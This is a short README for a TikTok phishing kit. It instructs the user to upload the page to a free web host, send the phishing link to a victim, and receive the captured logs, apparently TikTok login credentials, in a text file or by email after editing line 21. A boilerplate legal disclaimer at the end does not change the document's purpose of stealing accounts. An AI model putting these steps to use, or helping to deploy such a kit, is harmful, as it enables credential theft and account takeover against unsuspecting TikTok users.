# Tiktok-Phishing


## Installation :
### 1. Upload this file to any webhosting site
### 2. I recommend 000webhost.com

## Usage :

### Send the Phishing link to Victim. All logs will be saved as  "erhancan.txt"

## Added New Feature :
#### 1. Now all Logs will be sent to your email.
#### 2. Just edit line number   21 and enter your email address. 
## Note:
#### Your hosting site should support  sending emails. For this purpose i recommend 000webhost.com 
 

## Legal Disclaimer:

**Usage of  this tool for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by the programme
